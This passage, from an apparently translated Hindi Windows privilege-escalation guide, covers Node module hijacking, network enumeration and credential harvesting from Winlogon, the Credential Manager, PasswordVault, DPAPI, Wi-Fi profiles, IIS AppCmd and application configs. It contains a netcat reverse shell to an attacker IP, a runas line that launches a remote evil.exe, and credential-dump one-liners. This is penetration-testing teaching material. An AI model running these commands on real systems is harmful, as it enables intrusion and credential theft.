- कोई third-party library `require("foo")` को `try/catch` में रखती हो और failure के बाद भी आगे चलती हो
- कोई package production builds से हटा दिया गया हो, packaging के दौरान शामिल न किया गया हो, या install न हो पाया हो
- vulnerable `require()` मुख्य application code के बजाय dependency tree के भीतर मौजूद हो

### Vulnerable targets की तलाश

Resolution path की पुष्टि के लिए **Procmon** का उपयोग करें:<sup>[[23]](#references)</sup>

- `Process Name` = target executable (`node.exe`, Electron app EXE, या wrapper process) के अनुसार filter करें
- `Path` में `node_modules` `contains` हो, इसके अनुसार filter करें
- `NAME NOT FOUND` और `C:\node_modules` के अंतर्गत अंतिम सफल open पर ध्यान दें

Unpacked `.asar` files या application sources में code review के लिए उपयोगी patterns:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Procmon या source review से **गुम package name** पहचानें।
2. यदि root lookup directory पहले से मौजूद नहीं है, तो उसे बनाएँ:

```powershell
mkdir C:\node_modules
```

3. एक module को ठीक उसी अपेक्षित नाम से डालें:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Victim application को trigger करें। यदि application `require("foo")` का प्रयास करती है और legitimate module मौजूद नहीं है, तो Node `C:\node_modules\foo.js` को load कर सकता है।

इस pattern में फिट होने वाले missing optional modules के वास्तविक उदाहरणों में `bluebird` और `utf-8-validate` शामिल हैं, लेकिन **technique** का दोबारा इस्तेमाल किया जा सकता है: कोई भी **missing bare import** खोजें जिसे कोई privileged Windows Node/Electron process resolve करेगा।

### Detection और hardening के सुझाव

- जब कोई user `C:\node_modules` बनाए या वहाँ नई `.js` files/packages लिखे, तो alert करें।
- `C:\node_modules\*` से पढ़ने वाली high-integrity processes की तलाश करें।
- Production में सभी runtime dependencies package करें और `optionalDependencies` के इस्तेमाल का audit करें।
- Third-party code में silent `try { require("...") } catch {}` patterns की समीक्षा करें।
- जब library इसका समर्थन करे, तो optional probes disable करें (उदाहरण के लिए, कुछ `ws` deployments `WS_NO_UTF_8_VALIDATE=1` के साथ legacy `utf-8-validate` probe से बच सकते हैं)।

## नेटवर्क

### शेयर्स

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts file

hosts file में hardcoded अन्य ज्ञात कंप्यूटरों की जाँच करें.

```
type C:\Windows\System32\drivers\etc\hosts
```

### नेटवर्क इंटरफ़ेस और DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### खुले पोर्ट

बाहर से **प्रतिबंधित सेवाओं** की जाँच करें

```bash
netstat -ano #Opened ports?
```

किसी local listener के लिए, उसके PID का मिलान process owner, executable path और उसे शुरू करने वाली किसी service या scheduled task से करें। Remote-control service, desktop user के रूप में access तभी दे सकती है, जब उसके authentication और command controls इसकी अनुमति दें। किसी अधिक privileged account के अंतर्गत चल रहा custom TCP application, समीक्षा का अलग लक्ष्य है: listener और binary path केवल शुरुआती सुराग हैं, जबकि authenticated memory-corruption route के लिए उसी binary और उस तक पहुँचने वाले input का विश्लेषण आवश्यक है। अगर कोई exposed port किसी system process का लगता है, तो backend service का attribution करने से पहले उसकी तुलना [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) से करें; केवल forwarding rule होने से यह साबित नहीं होता कि destination तक पहुँचा जा सकता है या वह vulnerable है।

### रूटिंग टेबल

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP तालिका

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### फ़ायरवॉल नियम

[**फ़ायरवॉल से जुड़े कमांड के लिए यह पेज देखें**](../basic-cmd-for-pentesters.md#firewall) **(नियमों की सूची बनाएँ, नियम बनाएँ, बंद करें, बंद करें...)**

[नेटवर्क enumeration के लिए और कमांड यहाँ](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binary `bash.exe` `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` में भी मिल सकता है।

यदि आपको root user मिल जाता है, तो आप किसी भी port पर listen कर सकते हैं (पहली बार `nc.exe` से किसी port पर listen करने पर GUI के ज़रिए पूछा जाएगा कि क्या firewall द्वारा `nc` को अनुमति दी जानी चाहिए)।

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Root के रूप में bash आसानी से शुरू करने के लिए, आप `--default-user root` आज़मा सकते हैं

आप `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` फ़ोल्डर में `WSL` फ़ाइलसिस्टम देख सकते हैं

WSL के अंदर Linux `root` होने से अपने-आप Windows Administrator अधिकार नहीं मिलते। यदि मौजूदा Windows पहचान किसी distribution के फ़ाइलसिस्टम को पढ़ सकती है, तो shell-history फ़ाइलें (जिनमें `/root/.bash_history` भी शामिल है) देखें—इनमें ऐसे commands दर्ज हो सकते हैं जिनमें credentials मौजूद हों। Privilege escalation के लिए फिर भी उच्च-अधिकार वाले वैध account और अनुमत authentication path की आवश्यकता होती है। `LocalState\rootfs` लेआउट पुराने WSL installations पर लागू होता है; WSL 2 में distribution आम तौर पर [`ext4.vhdx` virtual disk](https://learn.microsoft.com/en-us/windows/wsl/disk-space) में संग्रहीत होती है, इसलिए पहले वास्तविक distribution और storage path की पहचान करें। Automated enumeration के दौरान history की सामग्री प्रिंट करने से बचें।

## Windows क्रेडेंशियल्स

### Winlogon क्रेडेंशियल्स

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

`DefaultUserName` और `DefaultDomainName` को credentials के बजाय account context मानें। गैर-खाली `DefaultPassword` या `AltDefaultPassword` value plaintext registry finding है। अगर `AutoAdminLogon=1` है, लेकिन कोई plaintext password पढ़ा नहीं जा सकता, तो यह केवल एक lead है: [Sysinternals Autologon पासवर्ड को LSA secret के रूप में स्टोर कर सकता है](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), और सामान्य registry reads से यह स्थापित नहीं होता कि वह secret मौजूद है या उसे retrieve किया जा सकता है। Credential exposure की रिपोर्ट करने से पहले access rights और वास्तविक logon configuration की समीक्षा करें।

### Credentials manager / Windows vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup> से\
Windows Vault servers, websites और अन्य programs के लिए user credentials स्टोर करता है, जिनका उपयोग **Windows** **users को अपने-आप log in करने के लिए** कर सकता है। पहले यह सुनने में ऐसा लग सकता है कि users Facebook, Twitter या Gmail जैसी sites के credentials स्टोर कर सकते हैं और browsers को अपने-आप log in करा सकते हैं, लेकिन यह इस तरह काम नहीं करता।

Windows Vault वे credentials स्टोर करता है जिनका उपयोग Windows users को अपने-आप log in कराने के लिए कर सकता है। इसका मतलब है कि कोई भी **Windows application जिसे किसी resource** (server या website) तक पहुँचने के लिए credentials की ज़रूरत हो, **इस Credential Manager** और Windows Vault का उपयोग कर सकता है और users द्वारा हर बार username और password डालने के बजाय दिए गए credentials का इस्तेमाल कर सकता है।

जब तक applications, Credential Manager के साथ interact नहीं करतीं, मुझे नहीं लगता कि वे किसी दिए गए resource के credentials का उपयोग कर सकती हैं। इसलिए, अगर आपका application vault का उपयोग करना चाहता है, तो उसे किसी तरह **credential manager से communicate करके उस resource के credentials** default storage vault से माँगने चाहिए।

मशीन पर स्टोर किए गए credentials की सूची देखने के लिए `cmdkey` का उपयोग करें।

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

फिर आप सहेजे गए credentials का उपयोग करने के लिए `/savecred` विकल्प के साथ `runas` का उपयोग कर सकते हैं। निम्न उदाहरण SMB share के माध्यम से remote binary को call करता है।

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

दिए गए क्रेडेंशियल्स के साथ `runas` का उपयोग करना।

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

ध्यान दें कि mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), या [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) का उपयोग किया जा सकता है।

### UWP PasswordVault / Credential Locker

आधुनिक Windows UWP applications, Microsoft Edge और आधुनिक system services, authentication tokens और plaintext passwords को Universal Windows Platform (UWP) के `PasswordVault` के अंदर संग्रहीत करते हैं (`vaultcmd` में यह `Web Credentials` के रूप में भी उपलब्ध है)। यह storage space हर session के लिए अलग होता है और इसे बिना administrative या `SeDebugPrivilege` अधिकारों के native रूप से decrypt किया जा सकता है।

संग्रहीत सभी usernames और plaintext passwords को तुरंत dump और decrypt करने के लिए, उपयोगकर्ता के active session में यह PowerShell command चलाएँ:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** डेटा के सममित एन्क्रिप्शन की एक विधि प्रदान करता है। इसका उपयोग मुख्य रूप से Windows ऑपरेटिंग सिस्टम में असममित private keys के सममित एन्क्रिप्शन के लिए किया जाता है। इस एन्क्रिप्शन में entropy बढ़ाने के लिए उपयोगकर्ता या सिस्टम के secret का महत्वपूर्ण योगदान होता है।

**DPAPI, उपयोगकर्ता के login secrets से प्राप्त सममित key के ज़रिए keys को एन्क्रिप्ट करता है**। सिस्टम एन्क्रिप्शन वाले मामलों में, यह सिस्टम के domain authentication secrets का उपयोग करता है।

DPAPI का उपयोग करके एन्क्रिप्ट की गई उपयोगकर्ता की RSA keys `%APPDATA%\Microsoft\Protect\{SID}` डायरेक्टरी में संग्रहित होती हैं, जहाँ `{SID}` उपयोगकर्ता के [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) को दर्शाता है। **DPAPI key, जो उसी फ़ाइल में उपयोगकर्ता की private keys की सुरक्षा करने वाली master key के साथ रखी जाती है**, आमतौर पर 64 bytes के random data से बनी होती है। (ध्यान दें कि इस डायरेक्टरी तक पहुँच प्रतिबंधित है, इसलिए CMD में `dir` कमांड से इसकी सामग्री की सूची नहीं देखी जा सकती; हालाँकि, PowerShell के ज़रिए इसकी सूची देखी जा सकती है।)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

आप इसे decrypt करने के लिए उपयुक्त arguments (`/pvk` या `/rpc`) के साथ **mimikatz module** `dpapi::masterkey` का उपयोग कर सकते हैं।

**master password द्वारा सुरक्षित credentials files** आमतौर पर यहाँ स्थित होती हैं:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

आप **mimikatz module** `dpapi::cred` को उपयुक्त `/masterkey` के साथ इस्तेमाल करके decrypt कर सकते हैं।\
अगर आप root हैं, तो `sekurlsa::dpapi` module से **memory** में मौजूद कई **DPAPI** **masterkeys** **extract** कर सकते हैं।

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell क्रेडेंशियल

**PowerShell credentials** का इस्तेमाल अक्सर **scripting** और automation tasks में encrypted credentials को आसानी से store करने के लिए किया जाता है। ये credentials **DPAPI** से सुरक्षित होते हैं, जिसका आम तौर पर मतलब है कि इन्हें केवल वही user उसी computer पर decrypt कर सकता है जिस पर इन्हें बनाया गया था।

Export किए गए credential का filename या `.xml` path कुछ भी हो सकता है। जब कोई script या file inventory इसकी ओर संकेत करे, तो `C:\Users` मान लेने के बजाय account की वास्तविक profile directory पता करें: [Windows profiles को दूसरी जगह रख सकता है](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory)। File को पढ़ पाना केवल एक सुराग है; [Windows का `Export-Clixml` encrypted credential को export करने वाले user और computer से जोड़ता है](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), और प्राप्त किए गए किसी भी account के पास लक्षित service पर अलग से वैध अधिकार होने चाहिए। नियमित enumeration के दौरान encrypted या plaintext values दिखाए बिना पहले paths और ACLs की जाँच करें।

किसी file में मौजूद PS credentials को **decrypt** करने के लिए आप यह कर सकते हैं:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### सहेजे गए RDP कनेक्शन

आप इन्हें `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\  
और `HKCU\Software\Microsoft\Terminal Server Client\Servers\` में पा सकते हैं।

### हाल ही में चलाए गए कमांड

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **रिमोट डेस्कटॉप क्रेडेंशियल मैनेजर**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Mimikatz के `dpapi::rdg` module का उपयोग उचित `/masterkey` के साथ **किसी भी .rdg फ़ाइल को decrypt करने** के लिए करें\
Mimikatz के `sekurlsa::dpapi` module से आप memory से **कई DPAPI masterkeys extract कर सकते हैं**

**mRemoteNG एक अलग connection store का उपयोग करता है।** `%APPDATA%\mRemoteNG` और user Documents के अंतर्गत पढ़ने योग्य XML की जाँच करें, जिनमें `config.xml` जैसे सामान्य नाम वाली फ़ाइलें भी शामिल हैं। किसी XML फ़ाइल को credential lead मानने से पहले connection schema और encrypted `Password` attributes की पहचान करें। Stored value DPAPI/RDCMan password नहीं है; उसे recover करना फ़ाइल की encryption settings और custom master password के उपयोग पर निर्भर करता है। बड़े पैमाने पर enumeration करते समय encrypted values को print करने से बचें।

**Remote Desktop Plus profile exports** भी user directories या shared administration folder में पढ़ने योग्य हो सकते हैं। पुराने `profiles.xml` export में `ProfileName`, `Password` और `Secure` elements वाली `Data/Profile` entries होती हैं। किसी nonempty password element को credential lead मानें, लेकिन उसे print न करें और न ही plaintext मानें: [vendor के अनुसार](https://www.donkz.nl/), profile protection बनाने वाले account और computer से bind हो सकती है, या कम सख्ती से configure की जा सकती है। उस पर निर्भर होने से पहले फ़ाइल के origin और recovery की शर्तों की पुष्टि करें।

### Sticky Notes

लोग अक्सर Windows workstations पर StickyNotes app का उपयोग **passwords** और अन्य जानकारी **save करने** के लिए करते हैं, यह समझे बिना कि यह एक database file है। यह फ़ाइल `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` पर स्थित होती है और इसे खोजना तथा जाँचना हमेशा उचित है।

लोग कभी-कभी sticky-note applications में passwords और अन्य जानकारी save करते हैं। Microsoft का packaged Sticky Notes app आम तौर पर notes को `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` पर store करता है; पुराने या दूसरे apps LevelDB सहित user-profile के अन्य stores का उपयोग कर सकते हैं। किसी गायब SQLite file को notes न होने का प्रमाण मानने से पहले installed app और storage format की पहचान करें।

यदि Sticky Notes SQLite write-ahead logging का उपयोग कर रहा है, तो केवल `plum.sqlite` की copy में हाल ही में committed notes छूट सकते हैं। Database की एक सुसंगत copy के साथ matching `plum.sqlite-wal` भी रखें, और उपलब्ध होने पर `plum.sqlite-shm` शामिल करें; shared-memory index को फिर से बनाया जा सकता है, लेकिन WAL database की persistent state का हिस्सा है। [SQLite का WAL documentation](https://www.sqlite.org/wal.html) देखें। किसी account name या password वाले note को केवल credential lead मानें: account, अनुमत access और password reuse की अलग से पुष्टि करें। किसी encrypted password-manager record से उच्च-विशेषाधिकार वाले login की पुष्टि करने के लिए उसकी वास्तविक decryption key और application-specific interpretation भी आवश्यक है।

### AppCmd.exe

**ध्यान दें कि AppCmd.exe से passwords recover करने के लिए आपको Administrator होना और High Integrity level के अंतर्गत चलाना आवश्यक है।**\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` directory में स्थित है।\
यदि यह फ़ाइल मौजूद है, तो संभव है कि कुछ **credentials** configure किए गए हों और उन्हें **recover** किया जा सके।

यह code [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) से extract किया गया था:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

जाँचें कि `C:\Windows\CCM\SCClient.exe` मौजूद है या नहीं।\
Installers को **SYSTEM privileges के साथ चलाया जाता है**, कई **DLL Sideloading के प्रति असुरक्षित हैं (जानकारी** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**)।**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## फ़ाइलें और Registry (क्रेडेंशियल्स)

### Support-tool registry क्रेडेंशियल आर्टिफ़ैक्ट्स

कुछ पुराने remote-support installations में application की निश्चित registry keys के अंतर्गत password-संबंधी value names बने रह सकते हैं। उदाहरण के लिए, [vendor की registry-key व्याख्या](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988) के अनुसार, TeamViewer के `SecurityPasswordAES` ने version 9 से पहले कॉन्फ़िगर किए गए static session password की पहचान की थी। Value-name marker केवल जाँच का एक संकेत है: उस क्रेडेंशियल का आकलन करने से पहले installed version, पढ़े जा सकने वाले value data, format और मौजूदा authentication behavior की पुष्टि करें। Remote-support password से अधिक privileges वाले Windows account तक पहुँचना तभी संभव है, जब वास्तव में password reuse हुआ हो और उस account के लिए authorization हो। नियमित enumeration output में ciphertext और recovered passwords न दिखाएँ।

### Protected sheets वाली साझा spreadsheets

यदि संदेह हो कि पढ़ी जा सकने वाली साझा workbook में account data है, तो **file encryption** और worksheet protection या hidden columns के बीच अंतर करें। [Microsoft के अनुसार](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), worksheet protection editing को नियंत्रित करती है और security feature नहीं है; इससे अपने-आप यह साबित नहीं होता कि workbook की सामग्री encrypted है। केवल अधिकृत और प्रासंगिक फ़ाइलों की समीक्षा करें और व्यापक enumeration के दौरान संभावित secrets न दिखाएँ। केवल पढ़ा जा सकने वाला `.xlsx` path, protected sheet या hidden column यह साबित नहीं करता कि credentials मौजूद हैं या किसी account के पास अधिक privileges हैं; वास्तविक data और मौजूदा account rights की अलग से पुष्टि करें।

### CI server में रखे गए change patches

Build पूरा होने के बाद भी CI server अपने data directory में जमा किए गए source changes रख सकता है। [TeamCity के दस्तावेज़](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) में `system/changes` को remote-run changes के storage के रूप में बताया गया है; data directory कॉन्फ़िगर की जा सकती है और यह ज़रूरी नहीं कि `ProgramData` के अंतर्गत हो। पढ़ा जा सकने वाला patch, credential file, encryption key या दोनों का उपयोग करने वाली script के हटाए गए या जोड़े गए references को सुरक्षित रख सकता है। उदाहरण के लिए, PowerShell के `ConvertTo-SecureString -Key` workflow के लिए AES key के साथ encrypted string भी चाहिए; [Microsoft के दस्तावेज़](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) के अनुसार, key अलग से दी जाती है। पहले केवल उपलब्ध patch names की समीक्षा करें, फिर authorization के तहत प्रासंगिक सामग्री देखें; नियमित enumeration output में secrets न दिखाएँ। केवल patch path, encrypted value या key reference से किसी मान्य credential या अधिक privileges वाले access की पुष्टि नहीं होती। Data-directory ACLs सीमित रखें और build changes में secrets commit न करें।

### Custom local administrator password rotation

घर में बनाए गए password rotator में encrypted local administrator password किसी local service में रखा जा सकता है, जबकि उसके datastore credentials किसी पढ़ी जा सकने वाली `.env` फ़ाइल में या updater binary के पास हो सकते हैं। Updater के scheduled task, account, configuration ACLs, listener और datastore permissions की एक साथ समीक्षा करें। केवल loopback पर उपलब्ध datastore भी उस local user के लिए पहुँच योग्य है जिसके पास मान्य credentials हैं, लेकिन authentication से प्रासंगिक records पढ़ने की अनुमति साबित नहीं होती। यदि encryption seed या key material ciphertext के पास उपलब्ध है, तो encryption पर भरोसा करने से पहले exact key derivation की जाँच करें। Go के [`math/rand`](https://pkg.go.dev/math/rand) का उपयोग करके exposed seed से नियतात्मक रूप से AES key बनाने वाली योजना उस password को सुरक्षित रखने के लिए अनुपयुक्त है; Go के दस्तावेज़ों के अनुसार, यह package security-संवेदनशील randomness के लिए उपयुक्त नहीं है। किसी recovered password को escalation path मानने से पहले पुष्टि करें कि वह अभी भी मान्य है और local Administrators-group account का है। केवल scheduled task, `.env` path या encrypted blob इनमें से किसी भी शर्त को साबित नहीं करता। नियमित enumeration output में passwords और key material न दिखाएँ।

Managed local administrator passwords के लिए [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) का उपयोग करें। इसका directory या Entra-backed storage और access controls, custom local datastore से अलग हैं; इसी तरह, [Elasticsearch roles](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) यह तय करते हैं कि authenticated datastore user किसी विशेष index को पढ़ सकता है या नहीं।

### Java server plugin archives और credential reuse

कुछ Java server plugins, server की `plugins` directory में JAR archives के रूप में वितरित किए जाते हैं। पढ़े जा सकने वाले custom plugin में configuration या bytecode के भीतर embedded service credential हो सकता है। Archive की समीक्षा केवल authorization के तहत करें और recovered secrets को नियमित enumeration output में न दिखाएँ। केवल plugin path से यह साबित नहीं होता कि secret मौजूद है; और recovered service password से अधिक privileges तभी मिलते हैं, जब वह अधिक privileged account के लिए भी मान्य हो। संबंधित file ACLs जाँचें और reused credentials को अलग-अलग secrets से बदलें। Directory layout के लिए [PaperMC की plugin installation guide](https://docs.papermc.io/paper/adding-plugins/) और archive contents के लिए [Oracle के JAR documentation](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) देखें।

### Openfire embedded database credentials

Embedded database का उपयोग करने वाला Openfire installation, `openfire.script` को `Openfire\embedded-db` के अंतर्गत रख सकता है। यदि मौजूदा account इसे पढ़ सकता है, तो `OFUSER` records और `passwordKey` property की एक साथ समीक्षा करें। Openfire के [user-provider documentation](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) के अनुसार, passwords plain text में या उस property में रखी key से encrypted रूप में संग्रहीत किए जा सकते हैं। Recovered password से escalation तभी संभव है, जब वह अधिक privileged identity के लिए अभी भी मान्य हो; केवल file name से न तो read access साबित होता है, न credential reuse। Path को inventory के संकेत के रूप में लें; database content और credentials को नियमित enumeration output में न दिखाएँ।

अलग `Openfire\conf\openfire.xml` फ़ाइल, external database के उपयोग के बावजूद, admin console के configured ports और bind interface की जानकारी दे सकती है। Openfire आम तौर पर अपने admin console को loopback पर bind करता है; listener चल रहा हो, तो local account फिर भी उस address तक पहुँच सकता है। Actual listener, authorized admin role, plugin-upload policy और Openfire service identity की एक साथ जाँच करें। Plugin install कर सकने वाला admin, plugin code को service के context में चला सकता है; यदि service LocalSystem के रूप में चलती है, तो यह context अत्यधिक privileged हो सकता है। केवल matching account password या पढ़ा जा सकने वाला configuration path, admin-console access या code execution साबित नहीं करता। Vendor की [installation और plugin-management guide](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) और [plugin-upload API property](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html) देखें।

### Forensic management server configuration

Velociraptor server configurations, जिन्हें आम तौर पर `server.config.yaml` नाम दिया जाता है, में internal CA का `CA.private_key` हो सकता है। यदि कम privileges वाला user उस key को पढ़ सकता है, तो वह API client certificate जारी कर सकता है। इससे अधिक privileges मिलेंगे या नहीं, यह server के user roles, API की पहुँच और server या target agent के execution identity पर निर्भर करता है। Client configuration में अलग material होता है; उसे मिलने से server CA तक access साबित नहीं होता। कुछ deployments में CA private key offline रखी जाती है, इसलिए पढ़ी जा सकने वाली server configuration में signing key मौजूद न भी हो सकती है।

Windows server पर, installation directory में **server** configuration और किसी भी सुरक्षित backup copy के ACL की जाँच करें। एक संभावित location `%ProgramFiles%\VelociraptorServer\server.config.yaml` है; service का configured path अलग हो, तो उसी का उपयोग करें। पुष्टि करें कि मौजूदा identity फ़ाइल पढ़ सकती है और `CA.private_key` वास्तव में मौजूद है। Logs या enumeration output में private key न दिखाएँ। Vendor का `config api_client` workflow client certificate जारी करने के लिए CA key का उपयोग करता है, लेकिन इसके लिए प्रभावी server-side role भी चाहिए; ऐसा role बनाने या बदलने के लिए datastore write access या restart की आवश्यकता हो सकती है। इन writes की अनुमति न होने पर भी कोई मौजूदा privileged server identity रास्ता दे सकती है। Execution rights वाली API queries संबंधित server या agent context में चलती हैं, जो अत्यधिक privileged हो सकता है।

